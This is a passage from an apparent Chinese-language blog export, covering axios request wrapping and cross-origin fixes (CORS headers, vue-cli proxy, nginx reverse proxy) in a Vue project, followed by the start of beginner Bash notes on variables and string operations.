<h4 id="1-2-2-使用"><a href="#1-2-2-使用" class="headerlink" title="1.2.2. 使用"></a>1.2.2. 使用</h4><p><code>axios</code>库的主要请求函数有：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">axios.<span class="title function_">request</span>(config)</span><br><span class="line">axios.<span class="title function_">get</span>(url[, config])  <span class="comment">// 表示 axios.get(url, config) 和 axios.get(url) 都被允许</span></span><br><span class="line">axios.<span class="title function_">delete</span>(url[, config])</span><br><span class="line">axios.<span class="title function_">head</span>(url[, config])</span><br><span class="line">axios.<span class="title function_">post</span>(url[, data[, config]])</span><br><span class="line">axios.<span class="title function_">put</span>(url[, data[, config]])</span><br><span class="line">axios.<span class="title function_">patch</span>(url[, data[, config]])</span><br></pre></td></tr></table></figure>

<p><code>config</code>对象的详细属性、请求的后续<code>then()/catch()</code>操作、配置的默认值&#x2F;defaults等等，见 <a href="https://www.kancloud.cn/yunye/axios/234845">Axios 中文说明</a>。</p>
<p>（以下纯属个人观点</p>
<p>为了更好地进行模块间的解耦，在<code>vue-cli3</code>构建的项目的<code>src\</code>目录下，创建<code>api\</code>目录，将项目所有需要进行的请求的配置<strong>封装</strong>到该目录下。</p>
<p>此处示例只封装到一个<code>api.js</code>文件，如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// src/api/api.js</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 允许跨域携带cookie</span></span><br><span class="line"><span class="comment">// axios.defaults.withCredentials = true;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">uploadelf</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> axios.<span class="title function_">request</span>(&#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;http://xxxxx.xxx/api/uploadelf&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">start</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> axios.<span class="title function_">request</span>(&#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;get&#x27;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;http://xxxxx.xxx/api/start&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">getDisassemble</span> = (<span class="params">funName = <span class="string">&#x27;main&#x27;</span></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> axios.<span class="title function_">request</span>(&#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;http://xxxxx.xxx/api/disassemble&#x27;</span>,</span><br><span class="line">        <span class="attr">data</span>: &#123;</span><br><span class="line">            funName</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中，每个函数返回一个调用请求后的对象，相当于设计模式中的<strong>工厂方法</strong>。</p>
<p>如此封装的好处是，用户使用时，<strong>并不需要知道某个请求的请求<code>url</code>和请求方式</strong>。</p>
<p>当你需要在其它模块中进行相应的请求时，只需要<code>import</code>导入<code>api.js</code>中相应的函数变量并调用即可，如：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// src/view/main.vue</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="comment">// 导入相应的请求函数</span></span><br><span class="line"><span class="keyword">import</span> &#123;uploadelf, start, getDisassemble&#125; <span class="keyword">from</span> <span class="string">&#x27;../api/api&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">assemb</span>: []</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">methods</span>: &#123;</span><br><span class="line">    <span class="title function_">click_uploadelf</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="comment">// 调用该工厂方法进行请求返回一个对象，再通过对象的then(), catch()方法进行后续操作</span></span><br><span class="line">      <span class="title function_">uploadelf</span>().<span class="title function_">then</span>(<span class="function"><span class="params">resp</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;uploadelf ---&gt;&#x27;</span>, resp.<span class="property">data</span>);</span><br><span class="line">      &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(error);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">click_start</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="title function_">start</span>().<span class="title function_">then</span>(<span class="function"><span class="params">resp</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start ---&gt;&#x27;</span>, resp.<span class="property">data</span>);</span><br><span class="line">      &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(error);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">click_getDisassemble</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="title function_">getDisassemble</span>(<span class="string">&#x27;main&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">resp</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;getDisassemble ---&gt;&#x27;</span>, resp.<span class="property">data</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">assemb</span> = resp.<span class="property">data</span>.<span class="property">message</span>;</span><br><span class="line">      &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(error);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="1-2-3-补充"><a href="#1-2-3-补充" class="headerlink" title="1.2.3. 补充"></a>1.2.3. 补充</h4><p><code>js</code>的请求属于<strong>异步</strong>操作(不需要等请求完成，函数直接执行结束)。所以，需要通过回调函数来实现请求完成的后续操作。</p>
<p><code>axios</code>主要利用<code>ES6 Promise</code>来实现异步请求的后续操作。</p>
<p>同时，异步请求会导致请求并行的情况。多个请求之前不能太接近。</p>
<h2 id="2-跨域问题"><a href="#2-跨域问题" class="headerlink" title="2. 跨域问题"></a>2. 跨域问题</h2><h3 id="2-1-问题"><a href="#2-1-问题" class="headerlink" title="2.1. 问题"></a>2.1. 问题</h3><p>如果是本机localhost:8000测试，可能会出现<strong>跨域问题</strong>，打开浏览器会看到如下报错：<br><img src="/vueJs%E8%AF%B7%E6%B1%82%E6%8E%A5%E5%8F%A3%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8F%8A%E9%97%AE%E9%A2%98/%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98.png" alt="跨域问题"></p>
<h3 id="2-2-补充"><a href="#2-2-补充" class="headerlink" title="2.2. 补充"></a>2.2. 补充</h3><ul>
<li><p>当两个域具有相同的协议(如http), 相同的端口(如80)，相同的域名如<code>www.baidu.com</code>，那么我们就可以认为它们是在相同的域中（协议，域名，端口都必须相同）。</p>
</li>
<li><p>跨域，就是指协议、域名、端口其中一个或多个不一致的情况下，从当前域去访问另一个域。</p>
</li>
<li><p>出于安全考虑(防止跨域攻击 XSS、CSRF)，<strong>浏览器</strong>会禁止跨域的请求访问。其实，<strong>同源策略</strong>是一种约定，它也是浏览器最核心也最基本的安全功能。</p>
</li>
</ul>
<h3 id="2-3-解决"><a href="#2-3-解决" class="headerlink" title="2.3. 解决"></a>2.3. 解决</h3><p>跨域问题解决有很多方式，主要讲以下三种。</p>
<h4 id="2-3-1-CROS-跨域资源共享"><a href="#2-3-1-CROS-跨域资源共享" class="headerlink" title="2.3.1. CROS(跨域资源共享)"></a>2.3.1. CROS(跨域资源共享)</h4><p>前端Vue，设置<code>axios</code>允许跨域带<code>cookie</code>(默认不带cookie)，如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// axios全局配置，允许跨域带cookie</span></span><br><span class="line">axios.<span class="property">defaults</span>.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>

<p>后端：</p>
<p>跨域请求后的<strong>响应头</strong>中需要设置：</p>
<ul>
<li><p><code>Access-Control-Allow-Origin</code>为发起请求的主机地址。</p>
</li>
<li><p><code>Access-Control-Allow-Credentials</code>，当它被设置为<code>true</code>时，允许跨域带<code>cookie</code>，但此时<code>Access-Control-Allow-Origin</code>不能为通配符<code>*</code>。</p>
</li>
<li><p><code>Access-Control-Allow-Headers</code>，设置跨域请求允许的请求头。</p>
</li>
<li><p><code>Access-Control-Allow-Methods</code>，设置跨域请求允许的请求方式。</p>
</li>
</ul>
<h4 id="2-3-2-Vue代理"><a href="#2-3-2-Vue代理" class="headerlink" title="2.3.2. Vue代理"></a>2.3.2. Vue代理</h4><p><code>vue-cli</code>自带代理功能，由<code>node</code>服务器实现。</p>
<p>在项目根目录下新增<code>vue.config.js</code>项目配置文件，然后配置代理：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 修改配置后一定要 重新npm run serve !!!</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">devServer</span>: &#123;</span><br><span class="line">        <span class="comment">// vue项目启动时的ip地址和端口</span></span><br><span class="line">        <span class="attr">host</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">        <span class="attr">port</span>: <span class="number">8000</span>,</span><br><span class="line">        <span class="attr">proxy</span>: &#123;</span><br><span class="line">            <span class="comment">// 匹配所有以 /api 开头的url</span></span><br><span class="line">            <span class="string">&#x27;/api&#x27;</span>: &#123;</span><br><span class="line">                <span class="comment">// 请求的目标主机</span></span><br><span class="line">                <span class="attr">target</span>: <span class="string">&#x27;http://xxx.xxx:8080&#x27;</span>,</span><br><span class="line">                <span class="attr">changeOrigin</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="attr">ws</span>: <span class="literal">true</span></span><br><span class="line">                <span class="comment">// 匹配路径中的 `/api` 替换成 `/`</span></span><br><span class="line">                <span class="comment">// pathRewrite: &#123;</span></span><br><span class="line">                <span class="comment">//   &#x27;^/api&#x27;: &#x27;/api&#x27;</span></span><br><span class="line">                <span class="comment">// &#125;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时需要将请求URL改成以<code>/api</code>开头，如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">axios.<span class="title function_">request</span>(&#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&#x27;/api/uploadelf&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>设置代理后，本地<code>nodejs</code>服务器会将目标主机的<code>url</code>代理到<code>vue</code>项目的<code>url</code>。</p>
<p>如：</p>
<p>访问<code>http://dev3.airdb.io:8080</code>，会转变成访问<code>http://localhost:8080</code>，再由<code>http://localhost:8080</code>转发请求到<code>http://dev3.airdb.io:8080</code>。</p>
<p>这样，就成了同域请求，浏览器不会进行限制。但实际上，还是请求了目标主机，只是欺骗了浏览器。</p>
<p>由于Vue代理需要利用<code>node</code>服务器，所以<strong>只适用于本地<code>npm run serve</code>调试</strong>时。</p>
<p>当项目部署到服务器时，可以使用<code>CROS</code>方式、<code>nginx</code>反向代理等方式。</p>
<h4 id="2-3-3-nginx反向代理"><a href="#2-3-3-nginx反向代理" class="headerlink" title="2.3.3. nginx反向代理"></a>2.3.3. nginx反向代理</h4><p>只需要在<code>nginx.conf</code>配置文件的<code>vue</code>项目对应的<code>server</code>中，添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 匹配vue项目中所有以/api开头的请求url</span><br><span class="line">location /api &#123;</span><br><span class="line">    include  uwsgi_params;</span><br><span class="line">    proxy_pass   http://0.0.0.0:8081; # 要代理访问的后端url</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完整示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       8000;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  _;</span><br><span class="line">    root         /pathto/vue_project/;</span><br><span class="line"></span><br><span class="line">    # Load configuration files for the default server block.</span><br><span class="line">    include /etc/nginx/default.d/*.conf;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        index index.html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page 404 /404.html;</span><br><span class="line">        location = /40x.html &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page 500 502 503 504 /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /api &#123;</span><br><span class="line">        include  uwsgi_params;</span><br><span class="line">        proxy_pass   http://0.0.0.0:8081;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>开发</category>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>shell学习笔记</title>
    <url>/shell%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>鉴于实习中经常使用 shell 语言，因此趁此机会好好学习一下“强大”的 shell 语言。</p>
<span id="more"></span>

<p>参考：</p>
<ul>
<li><a href="https://wangdoc.com/bash/index.html">Bash 脚本教程</a></li>
<li><a href="http://c.biancheng.net/cpp/shell/">Linux Shell脚本教程：30分钟玩转Shell脚本编程</a></li>
</ul>
<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>shell 直译为壳。在操作系统（Linux）中，被称为外壳，通常与 kernel 内核相对立。在没有图形界面的时代，shell 是<strong>用户与操作系统交互的接口</strong>。</p>
<p>shell 本身是一个程序。在操作系统实验课程中，老师曾让我们实现一个微型 shell ，代码见：<a href="https://github.com/99MyCql/OS_pratice/blob/master/pratice2/sh3.c">https://github.com/99MyCql/OS_pratice</a>。它包括 shell 的许多基本功能：<strong>命令提示符</strong>、<strong>运行命令&#x2F;程序</strong>（如：cat、echo、ls等）、<strong>重定向输入输出</strong>、<strong>管道</strong>。完成实验时，成就感满满，几乎与真实的 shell 无疑。</p>
<p>但，当时的我可能忽略了 shell 的另一个“身份”——<strong>解释器</strong>。shell 解释器可运行 shell 脚本语言，它支持变量、条件判断、循环等等语法。这让 shell 具备了<strong>可编程性</strong>，而失去这一大功能的 shell 只能称为 mini shell 。</p>
<p>关于解释型语言的定义，以及与编译型语言的区别，就不在此赘述了。</p>
<p>shell 分为很多种，包括：Bourne Shell（sh）、Bourne Again shell（bash）、Z Shell（zsh）等等，它们的本质基本相同，本文将主要基于 <strong>Bash Shell</strong> 。</p>
<p>接触过 python 的hxd应该知道，python 既可以在解释器中一行一行地敲，也可以写在一个文件中再运行文件。</p>
<p>shell 也是同理，既可以运行在命令行，也可以写入脚本文件再执行。shell 脚本语言的代码文件以 <code>.sh</code> 结尾：</p>
<ul>
<li>可以通过执行解释器执行：<code>bash test.sh</code></li>
<li>或者直接使用当前命令行的解释器执行：相对路径执行 <code>./test.sh</code> 或绝对路径 <code>/home/test/test.sh</code>（需为脚本添加可执行权限 <code>chmod +x test.sh</code> ）</li>
</ul>
<p>在 shell 脚本文件中，需要在<strong>第一行添加</strong>如下内容，指定解释器，如下指定 bash shell 为解释器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 或者， env 命令（这个命令总是在 /usr/bin 目录），返回 Bash 可执行文件的位置</span></span><br><span class="line"><span class="comment">#!/usr/bin/env bash</span></span><br></pre></td></tr></table></figure>

<p>shell 中注释为 <code>#</code> 。</p>
<h2 id="2-使用命令"><a href="#2-使用命令" class="headerlink" title="2. 使用命令"></a>2. 使用命令</h2><p>在 shell 命令行中，可以输入cat、echo、grep等命令（这些命令本质是一个可执行文件），去执行对应的程序。</p>
<p>同样，在 shell 脚本中，也可以使用命令，包括<strong>内部命令</strong>和<strong>外部命令</strong>（在我看来 shell 语言中的命令就相当于其他语言中的<strong>库函数</strong>）。比如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello world&quot;</span></span><br></pre></td></tr></table></figure>

<p>同时还包括：</p>
<ul>
<li>管道 <code>|</code></li>
<li>重定向 <code>&lt;</code> <code>&gt;</code></li>
<li>命令结束符 <code>;</code> 。使用：<code>Command1 ; Command2</code> 允许单行多个命令，第二个命令总是接着第一个命令执行，不管第一个命令执行成功或失败。</li>
<li>命令组合符 <code>&amp;&amp;</code> <code>||</code> 。使用：<code>Command1 &amp;&amp; Command2</code> 第一个命令运行成功，才继续运行第二个命令；<code>Command1 || Command2</code> 第一个命令运行失败，才继续运行第二个命令。</li>
</ul>
<p>更多 Linux 命令可以参见我的另一篇笔记：<a href="https://99mycql.github.io/application/linux%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0.html">linux命令学习笔记</a>。</p>
<h2 id="3-变量"><a href="#3-变量" class="headerlink" title="3. 变量"></a>3. 变量</h2><h3 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=value</span><br><span class="line">var=<span class="string">&#x27;value&#x27;</span></span><br><span class="line">var=<span class="string">&quot;value&quot;</span></span><br></pre></td></tr></table></figure>

<p>变量名：由字母、数字和下划线字符组成；首字符必须是字母下划线，不能是数字。</p>
<p>变量值：没有数据类型的概念，都是字符串，如果值中包含空格，需使用引号包围。</p>
<p><strong>注意：赋值符号附近不能有空格。</strong></p>
<p>同时，可以<strong>将命令执行的结果赋给变量</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=`<span class="built_in">command</span>`</span><br><span class="line">var=$(<span class="built_in">command</span>) <span class="comment"># 更推荐这种表示方式</span></span><br></pre></td></tr></table></figure>

<p>也可以<strong>将运算结果赋给变量</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=$((<span class="number">5</span> * <span class="number">7</span>))</span><br></pre></td></tr></table></figure>

<h3 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h3><p>两种方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$var</span></span><br><span class="line"><span class="variable">$&#123;var&#125;</span> <span class="comment"># 更推荐这种表示方式</span></span><br></pre></td></tr></table></figure>

<p>花括号 <code>&#123;&#125;</code> 用于区分变量边界。比如：在如下代码中，不使用花括号，会把 <code>varScript</code> 当成变量。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;Java&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;I am good at <span class="variable">$varScript</span>&quot;</span> <span class="comment"># 错误</span></span><br></pre></td></tr></table></figure>

<p>如果变量值<strong>包含连续空格或制表符，使用变量时应用双引号 <code>&quot;&quot;</code> 包围起来</strong>，因为 Shell 会将多个空格合为一个：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;1      2  3&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var</span>   <span class="comment"># 1 2 3</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$var</span>&quot;</span> <span class="comment"># 1      2  3</span></span><br></pre></td></tr></table></figure>

<p><strong>注意：当使用单引号 <code>&#39;&#39;</code> 将包围变量时，变量将不会解析，而是会被当成普通字符串</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;1      2  3&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var</span>   <span class="comment"># 1 2 3</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$var</span>&quot;</span> <span class="comment"># 1      2  3</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$var&#x27;</span> <span class="comment"># $var</span></span><br></pre></td></tr></table></figure>

<h3 id="修改变量值"><a href="#修改变量值" class="headerlink" title="修改变量值"></a>修改变量值</h3><p>重新赋值即可：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;hello world&quot;</span> <span class="comment"># hello world</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var</span></span><br><span class="line">var=<span class="string">&quot;hello world!!!&quot;</span> <span class="comment"># hello world!!!</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var</span></span><br></pre></td></tr></table></figure>

<h3 id="删除变量"><a href="#删除变量" class="headerlink" title="删除变量"></a>删除变量</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var=<span class="string">&quot;hello world&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var</span> <span class="comment"># hello world</span></span><br><span class="line"><span class="built_in">unset</span> var</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>shell 中不存在的变量一律等于空字符串，所以即使unset命令删除了变量，还是可以读取这个变量（值为空字符串）。而且，被删除的变量可再次使用。</p>
<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>用户创建的变量仅用于当前 Shell，子 Shell （在当前shell中运行的shell）默认读取不到父 Shell 定义的变量。</p>
<p>使用 <code>export</code> 命令可以设置变量为环境变量，使子 shell 可以读取该变量。</p>
<p>测试脚本 <code>test.sh</code> 如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$test_export</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$test_noexport</span></span><br><span class="line"><span class="built_in">export</span> test_export2=<span class="string">&quot;export&quot;</span></span><br></pre></td></tr></table></figure>

<p>运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">export</span> test_export=<span class="string">&quot;export&quot;</span> <span class="comment"># 设为环境变量，子 shell 可读</span></span><br><span class="line">$ test_noexport=<span class="string">&quot;no export&quot;</span></span><br><span class="line">$ ./test.sh</span><br><span class="line"><span class="built_in">export</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$test_export2</span> <span class="comment"># 显然，父 shell 也读不到子 shell export 的变量</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意：子 Shell 如果修改环境变量，不会影响父 Shell 。</p>
<p>常用的环境变量有：</p>
<ul>
<li><code>HOME</code>：用户的主目录。</li>
<li><code>HOST</code>：当前主机的名称。</li>
<li><code>PATH</code>：由冒号分开的目录列表，当输入可执行程序名后，会搜索这个目录列表。</li>
<li><code>PWD</code>：当前工作目录。</li>
<li><code>USER</code>：当前用户的用户名。</li>
<li><code>LINENO</code>：返回它在脚本中的行号。</li>
<li><code>FUNCNAME</code>：返回一个数组，内容是当前的函数调用堆栈。该数组的0号成员是当前调用的函数，1号成员是调用当前函数的函数。</li>
<li><code>BASH_SOURCE</code>：返回一个数组，内容是当前的脚本调用堆栈。该数组的0号成员是当前执行的脚本，1号成员是调用当前脚本的脚本</li>
</ul>
<h3 id="只读变量"><a href="#只读变量" class="headerlink" title="只读变量"></a>只读变量</h3><p><code>readonly</code> 命令指示变量只读，不可修改。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">readonly</span> var=<span class="string">&quot;hello&quot;</span></span><br><span class="line">var=<span class="string">&quot;hello world&quot;</span>   <span class="comment"># var: readonly variable</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var</span>           <span class="comment"># hello</span></span><br></pre></td></tr></table></figure>

<h3 id="变量默认值"><a href="#变量默认值" class="headerlink" title="变量默认值"></a>变量默认值</h3><ul>
<li><code>$&#123;var:-word&#125;</code> 如果变量 var 为空或已被删除(unset)，那么返回 word，但不改变 var 的值。</li>
<li><code>$&#123;var:=word&#125;</code> 如果变量 var 为空或已被删除(unset)，那么返回 word，并将 var 的值设置为 word。</li>
<li><code>$&#123;var:?message&#125;</code> 如果变量 var 为空或已被删除(unset)，那么将消息 message 送到标准错误输出，并将脚本停止运行，可以用来检测变量 var 是否可以被正常赋值。</li>
<li><code>$&#123;var:+word&#125;</code> 如果变量 var 被定义，那么返回 word，但不改变 var 的值。</li>
</ul>
<h3 id="特殊变量"><a href="#特殊变量" class="headerlink" title="特殊变量"></a>特殊变量</h3><ul>
<li><code>$0</code> 当前脚本的文件名。</li>
<li><code>$n</code> 传递给脚本或函数的参数，<code>$1</code> 表示第一个参数，<code>$2</code> 表示第二个参数。</li>
<li><code>$#</code> 传递给脚本或函数的参数个数。</li>
<li><code>$*</code> 传递给脚本或函数的所有参数。</li>
<li><code>$@</code> 传递给脚本或函数的所有参数。被双引号 <code>&quot;&quot;</code> 包含时，<code>$*</code> 会将所有参数作为一个整体，而 <code>$@</code> 会分开。</li>
<li><code>$?</code> 上个命令的退出状态，或函数的返回值。</li>
<li><code>$$</code> 当前Shell进程ID。对于 Shell 脚本，就是这些脚本所在的进程ID。</li>
</ul>
<h2 id="4-字符串"><a href="#4-字符串" class="headerlink" title="4. 字符串"></a>4. 字符串</h2><p>字符串是 shell 最基本的数据类型。</p>
<p>拼接字符串（推荐使用 <code>&#123;&#125;</code> ）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str=<span class="string">&quot;world&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello <span class="variable">$str</span>!&quot;</span>    <span class="comment"># hello world!</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello <span class="variable">$&#123;str&#125;</span>!&quot;</span>  <span class="comment"># hello world!</span></span><br></pre></td></tr></table></figure>

<p>获取字符串长度（变量使用必须要加 <code>&#123;&#125;</code> ）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str=<span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#str&#125;</span> <span class="comment"># 5</span></span><br></pre></td></tr></table></figure>

<p>提取字符串（<code>offset</code> 默认为0，<code>length</code> 默认到结尾）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$&#123;str:offset:length&#125;</span></span><br></pre></td></tr></table></figure>

<p>字符转义：</p>
<ul>
<li>经典的转义字符 <code>\n</code> <code>\t</code> 转义；</li>
<li>对于 shell 中的特殊字符，如 <code>$</code> <code>*</code> <code>&amp;</code> 等，需要转义；</li>
<li>使用单引号 <code>&#39;&#39;</code> 时，转义字符都会被当成普通字符串</li>
</ul>
<p>字符串匹配并删除：</p>
<ul>
<li><p><code>$&#123;str#pattern&#125;</code> 从字符串<strong>首字符</strong>开始，删除最短匹配的部分，返回剩余字符串。<code>pattern</code> 支持 <code>*</code>、<code>?</code>、<code>[]</code> 等通配符。</p>
</li>
<li><p><code>$&#123;str##pattern&#125;</code> 从字符串<strong>首字符</strong>开始，删除最长匹配（贪婪匹配）的部分，返回剩余字符串。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str=/home/root/shell/study</span><br><span class="line">str=<span class="variable">$&#123;str#/*/&#125;</span>    <span class="comment"># root/shell/study</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$str</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;str##/*/&#125;</span>  <span class="comment"># root/shell/study</span></span><br><span class="line">str=/home/root/shell/study</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;str##/*/&#125;</span>  <span class="comment"># study</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>$&#123;str%pattern&#125;</code> 从字符串<strong>尾字符</strong>开始，删除最短匹配的部分，返回剩余字符串。</p>
</li>
<li><p><code>$&#123;str%%pattern&#125;</code> 从字符串<strong>尾字符</strong>开始，删除最长匹配的部分，返回剩余字符串。</p>
</li>
</ul>
